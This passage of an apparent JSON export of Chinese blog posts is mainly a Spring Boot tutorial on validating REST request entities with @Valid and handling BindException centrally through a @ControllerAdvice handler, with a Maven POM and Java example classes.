starter应该包含下面这些组件：\n* `autoconfigure` 模块包含了自动配置的代码\n* `starter`模块提供了一个autoconfigure的模块和其他额外的依赖。\n\n### 命名的问题\n\n需要确保为我们的starter提供了一个合适名字，不要让模块名字叫`spring-boot`等一系列不知所云的名称，即使你用的不同的Maven GroupId，我们应当让模块名称更规范，容易理解。\n\n例如我们正在创建一个`acme`的start模块，命名推荐叫做`acme-spring-boot-autoconfigure`和`acme-spring-boot-starter`，\n\n\n## final\n\nstarter其实是一个空的模块，它的唯一目的其实就是提供一个必要的依赖关系，",
			"tags":"spring,spring-boot",
			"id":"75082160",
			"categories":"JAVA_spring",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年06月30日 17:18:01",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"阅读Spring.io官网的valid表单验证demo和教程。我先说一下spring Boot官方的教程，然后再简单说一下统一验证管理的一些写法方便懒人或者说代码优化。\n表单的注解 需要项目依赖于hibernate-validtor组件，在spring-boot-starter-web中已经自带了hibernate-validtor，无需再对maven进行依赖。创建一个Spring boot的项目，",
			"title":"Spring Boot对表单实体做REST API请求自动封装验证",
			"type":"original",
			"content":"<blockquote>\n  <p>阅读<a href=\"https://spring.io/guides/gs/validating-form-input/\" target=\"_blank\">Spring.io</a>官网的valid表单验证demo和教程。我先说一下spring Boot官方的教程，然后再简单说一下统一验证管理的一些写法方便懒人或者说代码优化。</p>\n</blockquote>\n\n<p>表单的注解 需要项目依赖于<code>hibernate-validtor</code>组件，在<code>spring-boot-starter-web</code>中已经自带了<code>hibernate-validtor</code>，无需再对maven进行依赖。</p>\n\n\n\n<h2 id=\"创建一个spring-boot的项目pom文件如下\">创建一个Spring boot的项目，pom文件如下：</h2>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-xml hljs \"><span class=\"hljs-pi\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">project</span> <span class=\"hljs-attribute\">xmlns</span>=<span class=\"hljs-value\">\"http://maven.apache.org/POM/4.0.0\"</span> <span class=\"hljs-attribute\">xmlns:xsi</span>=<span class=\"hljs-value\">\"http://www.w3.org/2001/XMLSchema-instance\"</span>\n    <span class=\"hljs-attribute\">xsi:schemaLocation</span>=<span class=\"hljs-value\">\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">modelVersion</span>&gt;</span>4.0.0<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">modelVersion</span>&gt;</span>\n\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">groupId</span>&gt;</span>org.springframework<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">artifactId</span>&gt;</span>gs-validating-form-input<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">version</span>&gt;</span>0.1.0<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">version</span>&gt;</span>\n\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">parent</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">groupId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">artifactId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">version</span>&gt;</span>1.5.3.RELEASE<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">version</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">parent</span>&gt;</span>\n\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">properties</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">java.version</span>&gt;</span>1.8<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">java.version</span>&gt;</span>\n     <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">properties</span>&gt;</span>\n\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">build</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">plugins</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">plugin</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">groupId</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">artifactId</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">plugin</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">plugins</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">build</span>&gt;</span>\n\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">dependencies</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">dependency</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">groupId</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">artifactId</span>&gt;</span>spring-boot-starter<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">artifactId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">dependency</span>&gt;</span>\n\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">dependency</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">groupId</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">artifactId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">dependency</span>&gt;</span>\n\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">dependency</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">groupId</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">artifactId</span>&gt;</span>spring-boot-starter-test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">artifactId</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">scope</span>&gt;</span>test<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">scope</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">dependencies</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">project</span>&gt;</span></code></pre>\n\n\n\n<h2 id=\"定义实体\">定义实体</h2>\n\n<p>定义个PersonForm实体，并填写注解信息</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-keyword\">package</span> hello;\n\n<span class=\"hljs-keyword\">import</span> javax.validation.constraints.Min;\n<span class=\"hljs-keyword\">import</span> javax.validation.constraints.NotNull;\n<span class=\"hljs-keyword\">import</span> javax.validation.constraints.Size;\n\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">PersonForm</span> {</span>\n    <span class=\"hljs-annotation\">@NotNull</span>\n    <span class=\"hljs-annotation\">@Size</span>(min=<span class=\"hljs-number\">2</span>, max=<span class=\"hljs-number\">30</span>)\n    <span class=\"hljs-keyword\">private</span> String name;\n\n    <span class=\"hljs-annotation\">@NotNull</span>\n    <span class=\"hljs-annotation\">@Min</span>(<span class=\"hljs-number\">18</span>)\n    <span class=\"hljs-keyword\">private</span> Integer age;\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getName</span>() {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.name;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setName</span>(String name) {\n        <span class=\"hljs-keyword\">this</span>.name = name;\n    }\n\n    <span class=\"hljs-keyword\">public</span> Integer <span class=\"hljs-title\">getAge</span>() {\n        <span class=\"hljs-keyword\">return</span> age;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setAge</span>(Integer age) {\n        <span class=\"hljs-keyword\">this</span>.age = age;\n    }\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">toString</span>() {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"Person(Name: \"</span> + <span class=\"hljs-keyword\">this</span>.name + <span class=\"hljs-string\">\", Age: \"</span> + <span class=\"hljs-keyword\">this</span>.age + <span class=\"hljs-string\">\")\"</span>;\n    }\n}</code></pre>\n\n<p><code>PersonForm</code> 类验证两个信息，一个是<code>name</code>，限制长度在2~30位之间；<code>age</code>，限制最小值18。</p>\n\n\n\n<h3 id=\"创建一个controller\">创建一个Controller</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-annotation\">@RestController</span>\n<span class=\"hljs-annotation\">@RequestMapping</span>(<span class=\"hljs-string\">\"/test\"</span>)\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">TestController</span> {</span>\n    <span class=\"hljs-annotation\">@PostMapping</span>(<span class=\"hljs-string\">\"test1\"</span>)\n    <span class=\"hljs-keyword\">public</span> AjaxResponse <span class=\"hljs-title\">test</span>(@Valid PersonForm personForm,BindingResult bindingResult){<span class=\"hljs-comment\">//【1】</span>\n   <span class=\"hljs-keyword\">if</span> (bindingResult.hasErrors()) {<span class=\"hljs-comment\">//【2】</span>\n            List&lt;FieldError&gt; errorList = bindingResult.getFieldErrors();\n            String errorMsg = errorList.get(<span class=\"hljs-number\">0</span>).getField() + <span class=\"hljs-string\">\" 字段错误，错误原因:\"</span> +       errorList.get(<span class=\"hljs-number\">0</span>).getDefaultMessage();\n            <span class=\"hljs-keyword\">return</span> error(errorMsg, FIELD_VALIDATE_ERROR.getKey());\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-keyword\">return</span> error(GLOBAL_UNKNOWN_ERROR);\n        }    \n    <span class=\"hljs-keyword\">return</span> ok(<span class=\"hljs-string\">\"suc\"</span>);\n    }\n}</code></pre>\n\n<ol>\n<li>定义了一个Rest的Controller，在1处增加一个Valid注解</li>\n<li>在第二个参数定义BindingResult对象，Spring将会为我们自动注入该值</li>\n<li>通过Controller方法去验证本次请求是否成功，如果此处不传递BindingResult对象，Spring将会向上抛出一个<code>BindException</code>异常，如果我们不做处理，Spring 内部对该异常做了一个html渲染异常的处理。</li>\n</ol>\n\n<p>启动项目，使用postman或其它http请求模拟插件做一个post请求<code>http://localhost:8080/test/test1</code>，通过填写的参数是否符合规范将返回不同的信息。</p>\n\n<p>通过例子我想大家已经学会使用Valid注解了，但是上面的讲解主要是针对controller具体的每一个方法做验证，没有做统一验证的处理。说明了一个问题如果每个Controller都这样写肯要<strong>搞死人</strong>，可能有很多个请求都会用到这个对象，那么都这样处理是不是写了很多废代码，没太搞明白Spring 的官方教程讲的这么浅显，没有做深入探究。小生在此探究一下上层的异常处理器来处理统一的<code>BindException</code>。</p>\n\n\n\n<h2 id=\"spring-boot定义统一上层的异常拦截器\">Spring Boot定义统一上层的异常拦截器</h2>\n\n<blockquote>\n  <p>在<a href=\"http://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/htmlsingle/#new-in-3.2-webmvc-controller-advice\" target=\"_blank\">Spring mvc 3.2引入了一个<code>ControllerAdvice</code>注解</a>，这个组件我们可以用来处理Controller层向上抛出的异常，通过一下步骤来实现</p>\n</blockquote>\n\n\n\n<h3 id=\"1-创建一个globalexceptionhandler类并在类上添加controlleradvice注解\">1. 创建一个<code>GlobalExceptionHandler</code>类并在类上添加<code>ControllerAdvice</code>注解</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-keyword\">package</span> com.iflytek.adsring.rosp.config;\n<span class=\"hljs-keyword\">import</span> org.springframework.validation.BindException;\n<span class=\"hljs-keyword\">import</span> org.springframework.validation.BindingResult;\n<span class=\"hljs-keyword\">import</span> org.springframework.validation.FieldError;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.bind.MethodArgumentNotValidException;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.bind.annotation.ControllerAdvice;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.bind.annotation.ExceptionHandler;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.bind.annotation.ResponseBody;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.bind.annotation.ResponseStatus;\n\n<span class=\"hljs-keyword\">import</span> javax.servlet.http.HttpServletRequest;\n<span class=\"hljs-keyword\">import</span> java.util.List;\n\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-keyword\">static</span> com.iflytek.adsring.rosp.api.AjaxResponse.error;\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-keyword\">static</span> com.iflytek.adsring.rosp.api.message.ServiceCode.FIELD_VALIDATE_ERROR;\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-keyword\">static</span> com.iflytek.adsring.rosp.api.message.ServiceCode.GLOBAL_UNKNOWN_ERROR;\n\n<span class=\"hljs-javadoc\">/**\n *<span class=\"hljs-javadoctag\"> @author</span> yoqu\n *<span class=\"hljs-javadoctag\"> @date</span> 2017年06月30日\n *<span class=\"hljs-javadoctag\"> @time</span> 下午2:53\n *<span class=\"hljs-javadoctag\"> @email</span> wcjiang2@iflytek.com\n */</span>\n<span class=\"hljs-annotation\">@ControllerAdvice</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">GlobalExceptionHandler</span> {</span>\n\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> Logger logger = LoggerFactory.getLogger(GlobalExceptionHandler.class);\n\n    <span class=\"hljs-annotation\">@ExceptionHandler</span>(value = Exception.class)\n    <span class=\"hljs-annotation\">@ResponseStatus</span>(HttpStatus.INTERNAL_SERVER_ERROR)\n    <span class=\"hljs-annotation\">@ResponseBody</span>\n    <span class=\"hljs-keyword\">public</span> AjaxResponse <span class=\"hljs-title\">errorHandler</span>(HttpServletRequest request, Exception e) {\n        logger.error(<span class=\"hljs-string\">\"request page url{}, params:{}, error:{}\"</span>, request.getRequestURI(), request.getParameterMap(), e);\n        <span class=\"hljs-keyword\">return</span> error(e.getMessage(), ServiceCode.GLOBAL_EXCEPTION_ERROR.getKey());\n    }\n\n    <span class=\"hljs-annotation\">@ExceptionHandler</span>(BindException.class)\n    <span class=\"hljs-annotation\">@ResponseBody</span>\n    <span class=\"hljs-annotation\">@ResponseStatus</span>(HttpStatus.BAD_REQUEST)\n    <span class=\"hljs-keyword\">public</span> AjaxResponse <span class=\"hljs-title\">validateErrorHandler</span>(BindException e) {\n        BindingResult bindingResult = e.getBindingResult();\n        <span class=\"hljs-keyword\">if</span> (bindingResult.hasErrors()) {\n            List&lt;FieldError&gt; errorList = bindingResult.getFieldErrors();\n            String errorMsg = errorList.get(<span class=\"hljs-number\">0</span>).getField() + <span class=\"hljs-string\">\" 字段错误，错误原因:\"</span> + errorList.get(<span class=\"hljs-number\">0</span>).getDefaultMessage();\n            <span class=\"hljs-keyword\">return</span> error(errorMsg, FIELD_VALIDATE_ERROR.getKey());\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-keyword\">return</span> error(GLOBAL_UNKNOWN_ERROR);\n        }\n    }\n}</code></pre>\n\n<ol>\n<li>在方法上写了一个@ExceptionHandler注解，value写拦截的异常，Exception为最大级别异常，如果一个子类异常没有被定义，所有的异常都将接入到该方法中去。</li>\n<li>ResponseStatus，如果发生了异常，需要返回一个状态码到前台处理</li>\n<li>ResponseBody，返回json串</li>\n</ol>\n\n<p>我们在ValidateErrorHandler中，通过上面的讲解，知道了验证不通过是导致发生了<code>BindException</code>异常，那么我们在这一层进行一个异常处理，通过记录日志和返回实体对象的方式来生成最后的结果。</p>\n\n\n\n<h3 id=\"2-重写之前的controller层的方法\">2. 重写之前的controller层的方法</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-annotation\">@RestController</span>\n<span class=\"hljs-annotation\">@RequestMapping</span>(<span class=\"hljs-string\">\"/test\"</span>)\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">TestController</span> {</span>\n    <span class=\"hljs-annotation\">@PostMapping</span>(<span class=\"hljs-string\">\"test1\"</span>)\n    <span class=\"hljs-keyword\">public</span> AjaxResponse <span class=\"hljs-title\">test</span>(@Valid PersonForm personForm){<span class=\"hljs-comment\">//【1】</span>\n    <span class=\"hljs-keyword\">return</span> ok(<span class=\"hljs-string\">\"suc\"</span>);\n    }\n}</code></pre>\n\n<p>在1处，我们删除了之前传递的第二个参数<code>BindingResult</code>，这样当验证不通过会将异常向上抛出，我们的全局拦截器将会拦截处理。</p>\n\n<p>用到的一些类： <br>\nAjaxResponse用于向前台打印消息的实体</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-keyword\">package</span> com.iflytek.adsring.rosp.api;\n<span class=\"hljs-keyword\">import</span> com.alibaba.fastjson.JSON;\n<span class=\"hljs-keyword\">import</span> java.io.Serializable;\n<span class=\"hljs-keyword\">import</span> java.util.Map;\n<span class=\"hljs-javadoc\">/**\n *<span class=\"hljs-javadoctag\"> @author</span> yoqu\n *<span class=\"hljs-javadoctag\"> @date</span> 2017年06月29日\n *<span class=\"hljs-javadoctag\"> @time</span> 下午2:29\n *<span class=\"hljs-javadoctag\"> @email</span> wcjiang2@iflytek.com\n */</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">AjaxResponse</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title\">Serializable</span> {</span>\n\n    <span class=\"hljs-javadoc\">/**\n     * 是否成功\n     */</span>\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">boolean</span> flag;\n\n    <span class=\"hljs-javadoc\">/**\n     * 响应吗\n     */</span>\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">int</span> code;\n\n    <span class=\"hljs-javadoc\">/**\n     * 业务状态码\n     */</span>\n    <span class=\"hljs-keyword\">private</span> String stateCode;\n\n    <span class=\"hljs-javadoc\">/**\n     * 数据\n     */</span>\n    <span class=\"hljs-keyword\">private</span> Object data;\n\n    <span class=\"hljs-javadoc\">/**\n     * 消息\n     */</span>\n    <span class=\"hljs-keyword\">private</span> String msg;\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-title\">AjaxResponse</span>() {\n\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-title\">AjaxResponse</span>(<span class=\"hljs-keyword\">boolean</span> flag, String msg) {\n        <span class=\"hljs-keyword\">this</span>.flag = flag;\n        <span class=\"hljs-keyword\">this</span>.msg = msg;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-title\">AjaxResponse</span>(<span class=\"hljs-keyword\">boolean</span> flag, String msg, Object data) {\n        <span class=\"hljs-keyword\">this</span>(flag, msg);\n        <span class=\"hljs-keyword\">this</span>.data = data;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-title\">AjaxResponse</span>(<span class=\"hljs-keyword\">boolean</span> flag, String msg, String stateCode, Object data) {\n        <span class=\"hljs-keyword\">this</span>(flag, msg, data);\n        <span class=\"hljs-keyword\">this</span>.stateCode = stateCode;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> AjaxResponse <span class=\"hljs-title\">ok</span>(Object data) {\n        <span class=\"hljs-keyword\">return</span> ok(<span class=\"hljs-string\">\"success\"</span>, data);\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> AjaxResponse <span class=\"hljs-title\">ok</span>(String msg){\n        <span class=\"hljs-keyword\">return</span> ok(msg,<span class=\"hljs-keyword\">null</span>);\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> AjaxResponse <span class=\"hljs-title\">ok</span>(String msg, Object data) {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> AjaxResponse(<span class=\"hljs-keyword\">true</span>, msg, data);\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> AjaxResponse <span class=\"hljs-title\">error</span>(String msg, String stateCode, Object data) {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> AjaxResponse(<span class=\"hljs-keyword\">false</span>, msg, stateCode, data);\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> AjaxResponse <span class=\"hljs-title\">error</span>(Map.Entry&lt;String,String&gt; code) {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> AjaxResponse(<span class=\"hljs-keyword\">false</span>,code.getValue(),code.getKey(),<span class=\"hljs-keyword\">null</span>);\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> AjaxResponse <span class=\"hljs-title\">error</span>(Map.Entry&lt;String,String&gt; code,Object data) {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> AjaxResponse(<span class=\"hljs-keyword\">false</span>,code.getValue(),code.getKey(),data);\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> AjaxResponse <span class=\"hljs-title\">error</span>(String msg, String stateCode) {\n        <span class=\"hljs-keyword\">return</span> error(msg, stateCode, <span class=\"hljs-keyword\">null</span>);\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> AjaxResponse <span class=\"hljs-title\">error</span>(String msg, Object data) {\n        <span class=\"hljs-keyword\">return</span> error(msg, <span class=\"hljs-string\">\"\"</span>, data);\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">boolean</span> <span class=\"hljs-title\">isFlag</span>() {\n        <span class=\"hljs-keyword\">return</span> flag;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setFlag</span>(<span class=\"hljs-keyword\">boolean</span> flag) {\n        <span class=\"hljs-keyword\">this</span>.flag = flag;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">int</span> <span class=\"hljs-title\">getCode</span>() {\n        <span class=\"hljs-keyword\">return</span> code;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setCode</span>(<span class=\"hljs-keyword\">int</span> code) {\n        <span class=\"hljs-keyword\">this</span>.code = code;\n    }\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getStateCode</span>() {\n        <span class=\"hljs-keyword\">return</span> stateCode;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setStateCode</span>(String stateCode) {\n        <span class=\"hljs-keyword\">this</span>.stateCode = stateCode;\n    }\n\n    <span class=\"hljs-keyword\">public</span> Object <span class=\"hljs-title\">getData</span>() {\n        <span class=\"hljs-keyword\">return</span> data;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setData</span>(Object data) {\n        <span class=\"hljs-keyword\">this</span>.data = data;\n    }\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getMsg</span>() {\n        <span class=\"hljs-keyword\">return</span> msg;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setMsg</span>(String msg) {\n        <span class=\"hljs-keyword\">this</span>.msg = msg;\n    }\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">toJSON</span>() {\n        <span class=\"hljs-keyword\">return</span> JSON.toJSONString(<span class=\"hljs-keyword\">this</span>);\n    }\n}</code></pre>\n\n<p>系统错误码<code>ServiceCode</code></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-keyword\">package</span> com.iflytek.adsring.rosp.api.message;\n\n<span class=\"hljs-keyword\">import</span> java.util.AbstractMap;\n<span class=\"hljs-keyword\">import</span> java.util.Map;\n\n<span class=\"hljs-javadoc\">/**\n *<span class=\"hljs-javadoctag\"> @author</span> yoqu\n *<span class=\"hljs-javadoctag\"> @date</span> 2017年06月30日\n *<span class=\"hljs-javadoctag\"> @time</span> 下午2:48\n *<span class=\"hljs-javadoctag\"> @email</span> wcjiang2@iflytek.com\n * 系统错误码对应库\n */</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">ServiceCode</span> {</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> Map.Entry&lt;String, String&gt; FIELD_VALIDATE_ERROR = <span class=\"hljs-keyword\">new</span> AbstractMap.SimpleEntry&lt;String, String&gt;(<span class=\"hljs-string\">\"100000000\"</span>, <span class=\"hljs-string\">\"参数错误\"</span>);\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> Map.Entry&lt;String, String&gt; GLOBAL_EXCEPTION_ERROR = <span class=\"hljs-keyword\">new</span> AbstractMap.SimpleEntry&lt;String, String&gt;(<span class=\"hljs-string\">\"100000001\"</span>, <span class=\"hljs-string\">\"系统异常\"</span>);\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> Map.Entry&lt;String, String&gt; GLOBAL_UNKNOWN_ERROR = <span class=\"hljs-keyword\">new</span> AbstractMap.SimpleEntry&lt;String, String&gt;(<span class=\"hljs-string\">\"100000002\"</span>, <span class=\"hljs-string\">\"未知错误\"</span>);\n}</code></pre>",
			"markdowncontent":"> 阅读[Spring.io](https://spring.io/guides/gs/validating-form-input/)官网的valid表单验证demo和教程。我先说一下spring Boot官方的教程，然后再简单说一下统一验证管理的一些写法方便懒人或者说代码优化。\n\n表单的注解 需要项目依赖于`hibernate-validtor`组件，在`spring-boot-starter-web`中已经自带了`hibernate-validtor`，无需再对maven进行依赖。\n\n## 创建一个Spring boot的项目，pom文件如下：\n```xml \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>org.springframework</groupId>\n    <artifactId>gs-validating-form-input</artifactId>\n    <version>0.1.0</version>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>1.5.3.RELEASE</version>\n    </parent>\n\n    <properties>\n        <java.version>1.8</java.version>\n     </properties>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n            </plugin>\n        </plugins>\n    </build>\n\n    <dependencies>\n    <dependency>\n\t\t\t<groupId>org.springframework.boot</groupId>\n\t\t\t<artifactId>spring-boot-starter</artifactId>\n\t\t</dependency>\n\n\t\t<dependency>\n\t\t\t<groupId>org.springframework.boot</groupId>\n\t\t\t<artifactId>spring-boot-starter-web</artifactId>\n\t\t</dependency>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n</project>\n```\n\n## 定义实体\n定义个PersonForm实体，并填写注解信息\n```java \npackage hello;\n\nimport javax.validation.constraints.Min;\nimport javax.validation.constraints.NotNull;\nimport javax.validation.constraints.Size;\n\npublic class PersonForm {\n    @NotNull\n    @Size(min=2, max=30)\n    private String name;\n\n    @NotNull\n    @Min(18)\n    private Integer age;\n\n    public String getName() {\n        return this.name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n\n    public String toString() {\n        return \"Person(Name: \" + this.name + \", Age: \" + 